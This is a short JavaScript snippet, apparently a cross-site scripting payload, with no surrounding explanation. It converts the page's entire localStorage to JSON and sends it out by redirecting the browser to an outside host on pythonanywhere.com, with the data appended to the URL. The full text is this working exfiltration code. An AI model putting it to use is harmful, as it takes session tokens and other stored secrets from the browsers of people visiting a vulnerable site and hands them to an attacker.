const data = JSON.stringify(localStorage);

const URL = 'https://naoriiz.pythonanywhere.com/' + data;

document.location.href = URL;